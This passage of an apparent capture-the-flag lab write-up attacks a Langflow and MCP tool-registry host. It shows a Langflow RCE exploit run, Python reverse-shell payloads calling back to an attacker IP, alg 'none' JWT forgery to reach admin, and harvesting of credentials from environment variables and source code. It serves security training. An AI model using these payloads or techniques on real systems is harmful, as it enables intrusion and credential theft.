+flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 32ms]</code></pre><p>Found a subdomain</p><p>Feroxbuster found nothing on the main site</p><p>Nuclei also did not find anything on the main site</p><p><img src="images/fireflow/pasted-image-20260822171555.webp" alt="Screenshot" loading="lazy" /></p><p>There is a link on the home page to what looks like an AI chatbot</p><p>This takes me to the subdomain</p><h2><code>flow</code> subdomain</h2><h3>Nuclei</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u https://flow.fireflow.htb/
+
+[CVE-2026-33017] [http] [critical] https://flow.fireflow.htb/api/v1/version
+[waf-detect:nginxgeneric] [http] [info] https://flow.fireflow.htb/
+[ssh-auth-methods] [javascript] [info] flow.fireflow.htb:22 [&quot;[&quot;publickey&quot;,&quot;password&quot;]&quot;]
+[ssh-password-auth] [javascript] [info] flow.fireflow.htb:22
+[ssh-sha1-hmac-algo] [javascript] [info] flow.fireflow.htb:22
+[ssh-server-enumeration] [javascript] [info] flow.fireflow.htb:22 [&quot;SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16&quot;]
+[tls-version] [ssl] [info] flow.fireflow.htb:443 [&quot;tls12&quot;]
+[tls-version] [ssl] [info] flow.fireflow.htb:443 [&quot;tls13&quot;]
+[weak-csp-detect:unsafe-default-src] [http] [info] https://flow.fireflow.htb/ [&quot;default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob: ws: wss:;&quot;]
+[missing-sri] [http] [info] https://flow.fireflow.htb/ [&quot;https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&amp;family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&amp;display=swap&quot;]
+[langflow-detect] [http] [info] https://flow.fireflow.htb/api/v1/version [&quot;1.8.2&quot;]
+[tech-detect:google-font-api] [http] [info] https://flow.fireflow.htb/
+[tech-detect:nginx] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:permissions-policy] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:x-frame-options] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://flow.fireflow.htb/
+[http-missing-security-headers:strict-transport-security] [http] [info] https://flow.fireflow.htb/
+[redoc-api-docs] [http] [info] https://flow.fireflow.htb/redoc
+[openapi] [http] [info] https://flow.fireflow.htb/openapi.json
+[ssl-issuer] [ssl] [info] flow.fireflow.htb:443 [&quot;Task Force Nightfall&quot;]
+[self-signed-ssl] [ssl] [low] flow.fireflow.htb:443
+[ssl-dns-names] [ssl] [info] flow.fireflow.htb:443 [&quot;fireflow.htb&quot;,&quot;*.fireflow.htb&quot;]
+[wildcard-tls] [ssl] [info] flow.fireflow.htb:443 [&quot;SAN: [fireflow.htb *.fireflow.htb]&quot;,&quot;CN: fireflow.htb&quot;]</code></pre><p>Found a critical CVE</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl https://flow.fireflow.htb/api/v1/version -k
+{&quot;version&quot;:&quot;1.8.2&quot;,&quot;main_version&quot;:&quot;1.8.2&quot;,&quot;package&quot;:&quot;Langflow&quot;}</code></pre><p>Curling the endpoint nuclei gave in the output also gave me the version of langflow</p><p>And after some research i see the CVE ID does line up with the version, it is an unauthenticated remote code execution exploit</p><h2>CVE-2026-33017</h2><blockquote><p>Langflow is a Python framework for building large language model-backed (LLM) workflows as visual flow graphs. One of its API endpoints, POST <code>/api/v1/build_public_tmp</code>/{flow_id}<code>/flow</code>, accepts a JSON body containing a code field and evaluates that code as Python in the service’s own process context. The endpoint is unauthenticated. It exists to allow users to prototype flows without logging in. What it actually does, in any instance exposed to the public internet, is handing a full, server-side code execution to anyone who sends a POST.</p></blockquote><p><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx" target="_blank" rel="noreferrer">https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx</a></p><p>However after some research i basically need to make a request to the <code>auto_logon</code> API endpoint to retrieve a super user token</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -s -k https://flow.fireflow.htb/api/v1/auto_login                        
+{&quot;detail&quot;:{&quot;message&quot;:&quot;Auto login is disabled.&quot;,&quot;auto_login&quot;:false}}</code></pre><p>In this instance <code>auto_logon</code> is disabled, so therefor i need to find a flow ID of an existing flow</p><p>This can still work it just means i cant generate my own flow ID, i need to find an existing one if there is one</p><p>After some research i see the flow_id is passed in the request</p><p><img src="images/fireflow/pasted-image-20260822180110.webp" alt="Screenshot" loading="lazy" /></p><p>So when im on the chatbot, ill open dev tools network tab, then type something into the prompt, then grab this request and read the path</p><p>Ive identified a public flow_id to be:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">7d84d636-af65-42e4-ac38-26e867052c25</code></pre><p>This is also reflected in the URL of the chatbot</p><p><a href="https://github.com/EQSTLab/CVE-2026-33017" target="_blank" rel="noreferrer">https://github.com/EQSTLab/CVE-2026-33017</a></p><p>Ive found a POC</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337</code></pre><p>Ill start a listener</p><p>On the first attempt, this attack fails, and reviewing the code i see its not handling HTTPS</p><p><img src="images/fireflow/pasted-image-20260822181512.webp" alt="Screenshot" loading="lazy" /></p><p>To fix this ill add a simple line to the <code>send_payload()</code> function</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 exploit.py --url https://flow.fireflow.htb/ --flow-id &#39;7d84d636-af65-42e4-ac38-26e867052c25&#39; --lhost 10.10.14.61 --lport 1337
+[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&amp;log_builds=false
+[*] Callback: 10.10.14.61:1337
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1110: InsecureRequestWarning: Unverified HTTPS request is being made to host &#39;flow.fireflow.htb&#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; fireflow 10.129.48.171 Linux-x86_64 👤 www-data(33) 😍️ Session ID &lt;1&gt;
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.48.171-Linux-x86_64/2026_08_22-18_15_44-799.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@fireflow:/var/lib/langflow$ whoami
+www-data
+www-data@fireflow:/var/lib/langflow$</code></pre><p>I now have a shell on the system</p><h2>Enumeration as <code>www-data</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">www-data@fireflow:/var/lib/langflow$ ls -la /home
+total 12
+drwxr-xr-x  3 root      root      4096 May 12 15:28 .
+drwxr-xr-x 23 root      root      4096 May 12 15:28 ..
+drwxr-x---  5 nightfall nightfall 4096 May 12 15:28 nightfall
+www-data@fireflow:/var/lib/langflow$ </code></pre><p>There is one user on the system!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">www-data@fireflow:/var/lib/langflow$ env
+LANGFLOW_LOG_LEVEL=warning
+SHELL=/usr/bin/bash
+USER_AGENT=langflow
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+SERVER_SOFTWARE=gunicorn/22.0.0
+LANGFLOW_NEW_USER_IS_ACTIVE=False
+PWD=/var/lib/langflow
+LOGNAME=www-data
+LANGFLOW_SUPERUSER=langflow
+SYSTEMD_EXEC_PID=1507
+LANGFLOW_CONFIG_DIR=/var/lib/langflow
+HOME=/var/www
+LANG=en_US.UTF-8
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
+INVOCATION_ID=b36394c51ffb472eb8325b72775841ad
+TERM=xterm-256color
+USER=www-data
+LANGFLOW_AUTO_LOGIN=False
+SHLVL=2
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
+JOURNAL_STREAM=8:9199
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
+LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
+_=/usr/bin/env
+OLDPWD=/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec
+www-data@fireflow:/var/lib/langflow$</code></pre><p>There is a password stored in the environment variable</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">n1ghtm4r3_b4_n1ghtf4ll</code></pre><p>Ill first try this on the nightfall user</p><h2>SSH access as <code>nightfall</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh nightfall@fireflow.htb
+nightfall@fireflow.htb&#39;s password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Aug 22 05:20:54 PM UTC 2026
+
+  System load:           0.01
+  Usage of /:            84.9% of 15.58GB
+  Memory usage:          50%
+  Swap usage:            0%
+  Processes:             245
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.48.171
+  IPv6 address for eth0: dead:beef::a0de:adff:feb4:c902
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+2 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+nightfall@fireflow:~$</code></pre><p>Using the pasword stored in the environment variable, i get SSH access</p><h2>Enumeration as <code>nightfall</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nightfall@fireflow:~/.mcp$ cat config.json 
+{
+  &quot;server&quot;: &quot;http://10.129.48.171:30080&quot;,
+  &quot;status_endpoint&quot;: &quot;/api/v1/version&quot;,
+  &quot;user&quot;: &quot;langflow-bot&quot;,
+  &quot;password&quot;: &quot;Langfl0w@mcp2026!&quot;
+}
+nightfall@fireflow:~/.mcp$</code></pre><p>Found another password!</p><p>Looks like there is an MCP server running</p><p><img src="images/fireflow/pasted-image-20260822184150.webp" alt="Screenshot" loading="lazy" /></p><p>Critically, it looks like it supports <code>none</code> algorithm, which means i might be able to forge a JWT for the application without a signature</p><p>First of all to make this easier i can forward this service to my machine, using an SSH tunnel</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh nightfall@fireflow.htb -L :30080:127.0.0.1:30080
+nightfall@fireflow.htb&#39;s password:</code></pre><p>So ill log back in and forward the service to my machine!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -s http://127.0.0.1:30080/api/v1/version | jq .
+{
+  &quot;service&quot;: &quot;MCP AI Tool Registry&quot;,
+  &quot;version&quot;: &quot;0.1.0&quot;,
+  &quot;auth&quot;: {
+    &quot;type&quot;: &quot;JWT&quot;,
+    &quot;header&quot;: &quot;Authorization: Bearer &lt;token&gt;&quot;,
+    &quot;supported_algorithms&quot;: [
+      &quot;HS256&quot;,
+      &quot;none&quot;
+    ]
+  },
+  &quot;docs&quot;: &quot;/docs&quot;,
+  &quot;endpoints&quot;: [
+    &quot;POST /mcp                        [MCP JSON-RPC 2.0]&quot;,
+    &quot;POST /api/v1/auth&quot;,
+    &quot;GET  /api/v1/tools&quot;,
+    &quot;POST /api/v1/tools               [admin]&quot;
+  ]
+}</code></pre><p>As a POC i can now curl the service from my machine!</p><h2>Crafting admin JWT </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/api/v1/auth --data &#39;{&quot;username&quot;:&quot;langflow-bot&quot;,&quot;password&quot;:&quot;Langfl0w@mcp2026!&quot;}&#39; -H &#39;Content-Type: application/json&#39; | jq .
+{
+  &quot;access_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps&quot;,
+  &quot;token_type&quot;: &quot;bearer&quot;
+}</code></pre><p>So first ill use the auth endpoint and send the username and password i found, and then use jq to parse the json data nicely</p><p>I now have an access token, it does support none algorithm</p><p><img src="images/fireflow/pasted-image-20260822195906.webp" alt="Screenshot" loading="lazy" /></p><p>Ill decode the first parts of the token, and get this output</p><p>Now i simply get the output, modify the user to be admin and the algorithm to <code>none</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}&#39; | base64               
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K
+
+echo &#39;{&quot;sub&quot;:&quot;ethan&quot;,&quot;role&quot;:&quot;admin&quot;}&#39; | base64         
+eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg==</code></pre><p>Now i have taken the output from the decode modified it and re-encoded it, now all i need to do is put it together</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.</code></pre><p>Ill strip the <code>=</code> away from the second part since its not needed, the i can leave the last part out since i am using the <code>none</code> algorithm so it does not need a signature</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.&#39; | jq .
+{
+  &quot;detail&quot;: [
+    {
+      &quot;type&quot;: &quot;missing&quot;,
+      &quot;loc&quot;: [
+        &quot;body&quot;
+      ],
+      &quot;msg&quot;: &quot;Field required&quot;,
+      &quot;input&quot;: null
+    }
+  ]
+}</code></pre><p>It allows me to authenticate!</p><h2>RCE via malicious application registration</h2><p><img src="images/fireflow/pasted-image-20260822203158.webp" alt="Screenshot" loading="lazy" /></p><p>So i can reach the <code>/docs</code> endpoint in my browser and read through this section, this tells me what i need to pass to register an application</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">{&quot;name&quot;:&quot;shell&quot;,&quot;description&quot;:&quot;RCE&quot;,&quot;inputSchema&quot;:{&quot;additionalProperties&quot;:{}},&quot;code&quot;:&quot;&quot;}</code></pre><p>After reading the docs i came up with this that ill pass as data, then ill pass a python reverse shell into the <code>code</code> parameter</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.61\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;/bin/bash\&quot;)</code></pre><p>This is the the shell ill use, ill bypass <code>&quot;</code> by placing a <code>\</code> before to escape them</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.&#39; --data &#39;{&quot;name&quot;:&quot;shell&quot;,&quot;description&quot;:&quot;RCE&quot;,&quot;inputSchema&quot;:{&quot;additionalProperties&quot;:{}},&quot;code&quot;:&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.61\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;}&#39; | jq .
+
+{
+  &quot;status&quot;: &quot;registered&quot;,
+  &quot;name&quot;: &quot;shell&quot;
+}</code></pre><p>Ill use the same request as before when i first crafted the JWT, but this time ill pass the payload as data</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -s http://127.0.0.1:30080/api/v1/tools
+[{&quot;name&quot;:&quot;ping_host&quot;,&quot;description&quot;:&quot;Ping a target host 3 times and return ICMP output.&quot;},{&quot;name&quot;:&quot;get_metrics_summary&quot;,&quot;description&quot;:&quot;Return a summary of system memory and load average from /proc.&quot;},{&quot;name&quot;:&quot;list_running_tasks&quot;,&quot;description&quot;:&quot;List the top 20 running processes sorted by CPU usage.&quot;},{&quot;name&quot;:&quot;shell&quot;,&quot;description&quot;:&quot;RCE&quot;}]</code></pre><p>Then making a GET request to the <code>/tools</code> endpoint i can see my tool registered!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337</code></pre><p>Then ill start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/mcp -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.&#39; --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:&quot;5&quot;,&quot;method&quot;:&quot;tools/call&quot;,&quot;params&quot;:{&quot;name&quot;:&quot;shell&quot;,&quot;arguments&quot;:{&quot;location&quot;:&quot;&quot;}}}&#39; | jq .</code></pre><p>Then following the MCP documentation i can call the tool</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; mcp-server-54464cb475-29ztf 10.129.48.171 Linux-x86_64 👤 mcp(1000) 😍️ Session ID &lt;1&gt;
+[+] Attempting to deploy Python Agent...
+[+] PTY upgrade successful via /usr/local/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/mcp-server-54464cb475-29ztf~10.129.48.171-Linux-x86_64/2026_08_22-21_10_24-821.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+mcp@mcp-server-54464cb475-29ztf:/app$ whoami
+mcp
+mcp@mcp-server-54464cb475-29ztf:/app$</code></pre><p>I now have a shell, but this shell dies shorly after, probably because the process is not running indefinitely</p><p>To get around this i can use a different python reverse shell with persistence</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">import socket,os,pty\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\&quot;10.10.14.61\&quot;,1337))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\&quot;/bin/sh\&quot;)</code></pre><p>This is the shell i will use</p><p>So it looks like its removed my tool, so ill re add it with the new shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.&#39; --data &#39;{&quot;name&quot;:&quot;shell&quot;,&quot;description&quot;:&quot;RCE&quot;,&quot;inputSchema&quot;:{&quot;additionalProperties&quot;:{}},&quot;code&quot;:&quot;import socket,os,pty\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\&quot;10.10.14.61\&quot;,1337))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\&quot;/bin/sh\&quot;)&quot;}&#39; | jq .
+{
+  &quot;status&quot;: &quot;registered&quot;,
+  &quot;name&quot;: &quot;shell&quot;
+}</code></pre><p>Now the new tool is registered with the persistent shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST -s http://127.0.0.1:30080/mcp -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.&#39; --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:&quot;5&quot;,&quot;method&quot;:&quot;tools/call&quot;,&quot;params&quot;:{&quot;name&quot;:&quot;shell&quot;,&quot;arguments&quot;:{&quot;location&quot;:&quot;&quot;}}}&#39; | jq .
+{
+  &quot;jsonrpc&quot;: &quot;2.0&quot;,
+  &quot;id&quot;: &quot;5&quot;,
+  &quot;result&quot;: {
+    &quot;content&quot;: [
+      {
+        &quot;type&quot;: &quot;text&quot;,
+        &quot;text&quot;: &quot;&quot;
+      }
+    ],
+    &quot;isError&quot;: false
+  }
+}</code></pre><p>Then ill trigger it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; mcp-server-54464cb475-29ztf 10.129.48.171 Linux-x86_64 👤 mcp(1000) 😍️ Session ID &lt;1&gt;
+[+] Attempting to deploy Python Agent...
+[+] PTY upgrade successful via /usr/local/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/mcp-server-54464cb475-29ztf~10.129.48.171-Linux-x86_64/2026_08_22-21_24_25-968.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+mcp@mcp-server-54464cb475-29ztf:/app$ whoami
+mcp
+mcp@mcp-server-54464cb475-29ztf:/app$</code></pre><p>Now i have a session that does not die!</p><h2>Enumeration as <code>mcp</code> user</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mcp@mcp-server-54464cb475-29ztf:/app$ cat main.py 
+from __future__ import annotations
+
+import json
+import subprocess
+from typing import Any, Dict, Optional
+
+from fastapi import Depends, FastAPI, HTTPException, Request, Response, status
+from fastapi.responses import JSONResponse
+from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
+from jose import JWTError
+from jose import jwt as jose_jwt
+from pydantic import BaseModel
+
+app = FastAPI(
+    title=&quot;MCP AI Tool Registry — Task Force Nightfall&quot;,
+)
+
+JWT_SECRET = &quot;mcp-jwt-secret-do-not-share&quot;
+JWT_ALGORITHM = &quot;HS256&quot;
+
+USERS: Dict[str, Dict[str, str]] = {
+    &quot;langflow-bot&quot;:   {&quot;password&quot;: &quot;Langfl0w@mcp2026!&quot;, &quot;role&quot;: &quot;user&quot;},
+    &quot;nightfall-admin&quot;: {&quot;password&quot;: &quot;4dm1n@NightfallOps!&quot;, &quot;role&quot;: &quot;admin&quot;},
+}
+
+...[SNIP]...</code></pre><p>Found some hardcoded credentials in the code!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mcp@mcp-server-54464cb475-29ztf:/app$ env
+SHELL=/usr/bin/bash
+KUBERNETES_SERVICE_PORT_HTTPS=443
+PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=mcp-server-54464cb475-29ztf
+PYTHON_VERSION=3.11.15
+PWD=/app
+MCP_SERVER_SERVICE_HOST=10.43.250.195
+MCP_SERVER_SERVICE_PORT=8080
+HOME=/home/mcp
+MCP_SERVER_PORT_8080_TCP_PROTO=tcp
+LANG=C.UTF-8
+KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.jxl=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+MCP_SERVER_PORT_8080_TCP_PORT=8080
+MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
+TERM=xterm-256color
+SHLVL=1
+MCP_SERVER_PORT=tcp://10.43.250.195:8080
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+MCP_SERVER_SERVICE_PORT_HTTP=8080
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_PORT=tcp://10.43.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+mcp@mcp-server-54464cb475-29ztf:/app$ </code></pre><p>Kubernetes install on port 443</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nightfall@fireflow:~$ netstat -ano | grep LISTEN
+tcp        0      0 127.0.0.1:46595         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:7860          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10010         0.0.0.0:*               LISTEN      off (0.00/0/0)
